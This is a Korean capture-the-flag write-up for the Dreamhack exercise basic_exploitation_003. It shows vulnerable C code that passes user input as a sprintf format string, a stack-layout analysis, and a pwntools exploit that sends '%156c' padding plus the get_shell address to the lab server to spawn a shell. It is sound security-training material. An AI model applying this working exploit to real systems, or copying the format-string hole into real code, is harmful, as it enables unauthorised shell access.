# Exercise: basic_exploitation_003

**실습 환경**

```
Ubuntu 16.04
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
```

**basic_exploitation_003.c 코드**

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}
void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(30);
}
void get_shell() {
    system("/bin/sh");
}
int main(int argc, char *argv[]) {
    char *heap_buf = (char *)malloc(0x80);
    char stack_buf[0x90] = {};
    initialize();
    read(0, heap_buf, 0x80);
    sprintf(stack_buf, heap_buf);
    printf("ECHO : %s\n", stack_buf);
    return 0;
}
```

<br>

**코드 분석**   

여기도 전 문제랑 비슷하게 `get_shell` 함수가 있으니 목적지는 정해져있고, 조금 다른 점은 동적 할당으로 받은 뒤에 다시 스택으로 옮기고 `printf`한다는 차이점이 있다.  

그럼 덮어도 다시 호출되지가 않으니까 그냥 스택의 리턴 주소에 값을 덮어버리자  

**동적 분석**

ret이 실행되기 전에 대충 브레이크를 걸고 AAAAAAAA 같은 아무 문자열을 넣어줬다.  


<img width="940" height="210" alt="image" src="https://github.com/user-attachments/assets/92e4c9e6-a928-43c5-9e1b-656eeab90a30" />



그러고 보면 `esp+0x98` 에 ebp가 있고 `ebp+4`에 리턴 주소가 있는게 보인다.  
즉 `esp+0x9c`에 리턴 주소가 있다는 뜻이니 그 거리만큼 길이 뒤에 `get_shell` 함수의 주소를 적어두면 `sprintf`가 알아서 복사해서 `printf`에게 전해줄 것이다.   

<br>

**익스플로잇 코드**  
 
```python
from pwn import *

#p = process('./basic_exploitation_003')
p = remote('host3.dreamhack.games', 9104)
e = ELF('./basic_exploitation_003')

get_shell = e.symbols['get_shell']

l = 0x9c
payload = f"%{l}c".encode() + p32(get_shell)

p.sendline(payload)

p.interactive()
```

바로 서버에 날려보면  

<img width="743" height="326" alt="image" src="https://github.com/user-attachments/assets/e9ea6017-4e8f-4b89-bb48-118b0566d8c7" />

잘 나온다.  
